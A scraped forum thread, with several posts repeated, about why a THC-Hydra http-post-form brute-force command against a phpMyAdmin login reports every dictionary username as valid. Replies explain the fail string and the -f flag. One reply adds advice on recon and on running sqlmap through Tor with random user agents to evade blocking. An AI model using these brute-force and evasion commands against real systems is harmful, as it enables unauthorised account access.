    <description>
Hello,
I want to find a PhpMyAdmin  username via THC-Hydra. The login page code is:
[code]
&lt;div class=&quot;item&quot;&gt;
            &lt;label for=&quot;input_username&quot;&gt;Username:&lt;/label&gt;
            &lt;input type=&quot;text&quot; name=&quot;pma_username&quot; id=&quot;input_username&quot; value=&quot;&quot; size=&quot;24&quot; class=&quot;textfield&quot;&gt;
        &lt;/div&gt;
        &lt;div class=&quot;item&quot;&gt;
            &lt;label for=&quot;input_password&quot;&gt;Password:&lt;/label&gt;
            &lt;input type=&quot;password&quot; name=&quot;pma_password&quot; id=&quot;input_password&quot; value=&quot;&quot; size=&quot;24&quot; class=&quot;textfield&quot;&gt;
[/code]
I used below command:
[code]
$ hydra -L /usr/share/dict/cracklib-small -p 123 192.168.56.5 http-post-form &#39;/phpmyadmin/index.php:pma_username=^USER^&amp;pma_password=^PASS^:incorrect&#39;
[/code]
But the result is:
[code]
[80][http-post-form] host: 192.168.56.5  login: agonized  password: 123
[80][http-post-form] host: 192.168.56.5  login: agnomen  password: 123
[80][http-post-form] host: 192.168.56.5  login: agonize  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreeableness  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreeable  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreed  password: 123
[80][http-post-form] host: 192.168.56.5  login: agrarian  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreers  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreeably  password: 123
[80][http-post-form] host: 192.168.56.5  login: agree  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreements  password: 123
[80][http-post-form] host: 192.168.56.5  login: agricola  password: 123
[80][http-post-form] host: 192.168.56.5  login: agribusiness  password: 123
[80][http-post-form] host: 192.168.56.5  login: agrees  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreer  password: 123
[80][http-post-form] host: 192.168.56.5  login: agrimony  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreement  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreement&#39;s  password: 123
[80][http-post-form] host: 192.168.56.5  login: agreeing  password: 123
...
[/code]
Which part of my command is wrong?

In [url=https://blog.christophetd.fr/write-up-mr-robot/]this[/url] tutorial, the author using THC-Hydra to find the username? Am I wrong?

Thank you.</description>

<p>Hey <span class="mention">@Jason</span>,</p>
<p>The way that Hydra knows that a particular credential works is using the “Fail String” which in your case is set to “incorrect”.</p>
<pre><code class="lang-auto">'/phpmyadmin/index.php:pma_username=^USER^&amp;pma_password=^PASS^:---&gt;incorrect&lt;---'
</code></pre>
<p>So, after trying out a username/password combo, if the response doesn’t contain the word “incorrect”, then hydra considers that username/password combo to be correct.</p>
<p>It is possible that the “Login Failed” page doesn’t contain the “Fail String” which you’ve provided and hydra eventually thinks that authentication was successful for all combinations.</p>
<p>To Fix,</p>
<ol>
<li>Check if the login failed page has this keyword</li>
<li>Add the <code>-f</code> flag so that hydra will terminate on the first successful attempt.</li>
</ol>
</blockquote>
</aside>
<p>This is the answer to your question above of “Why it tell me that found the password but password not working”? My advice is to understand the tools you are using and stop asking questions that already have been answered.</p>

            <p>Sorry for the very delayed response.<br>
Doubt it but do you still need help with this?</p>
<p>If yeah then do you have any details of the site/server/remote that you’re targeting?<br>
Like have you run any initial recon exercises on the host? Identifying the backend would be handy. Usually easy enough to do by just visiting the site on your browser with the wappalyzer extension installed and shodan wouldn’t hurt either.<br>
Knowing what you’re dealing with will go a much longer way in terms of time saving and knowing which attack vector to go with.</p>
<p>As a side note if you’re gonna use crawl with sqlmap you may as well be going at crawl=3 and it’s generally a good idea to always use the ‘—random-agent‘ flag. If you get blocked or dropped by any WAF (which you don’t seem to be in this case but going to mention it anyway) you can try using tor. Just make sure you have the tor service running then add ‘—check-tor’ &amp; ‘—tor’ flags. Otherwise if you have proxies then use those.</p>

            <p>Hey <span class="mention">@Jason</span>,</p>
<p>The way that Hydra knows that a particular credential works is using the “Fail String” which in your case is set to “incorrect”.</p>
<pre><code class="lang-auto">'/phpmyadmin/index.php:pma_username=^USER^&amp;pma_password=^PASS^:---&gt;incorrect&lt;---'
</code></pre>
<p>So, after trying out a username/password combo, if the response doesn’t contain the word “incorrect”, then hydra considers that username/password combo to be correct.</p>
<p>It is possible that the “Login Failed” page doesn’t contain the “Fail String” which you’ve provided and hydra eventually thinks that authentication was successful for all combinations.</p>
<p>To Fix,</p>
<ol>
<li>Check if the login failed page has this keyword</li>
<li>Add the <code>-f</code> flag so that hydra will terminate on the first successful attempt.</li>
</ol>

            <p>Hello,<br>
I want to find a PhpMyAdmin  username via THC-Hydra. The login page code is:</p>
<pre><code class="lang-auto">&lt;div class="item"&gt;
            &lt;label for="input_username"&gt;Username:&lt;/label&gt;
            &lt;input type="text" name="pma_username" id="input_username" value="" size="24" class="textfield"&gt;
        &lt;/div&gt;
        &lt;div class="item"&gt;
            &lt;label for="input_password"&gt;Password:&lt;/label&gt;
            &lt;input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield"&gt;</code></pre>
<p>I used below command:</p>
<pre><code class="lang-auto">$ hydra -L /usr/share/dict/cracklib-small -p 123 192.168.56.5 http-post-form '/phpmyadmin/index.php:pma_username=^USER^&amp;pma_password=^PASS^:incorrect'</code></pre>
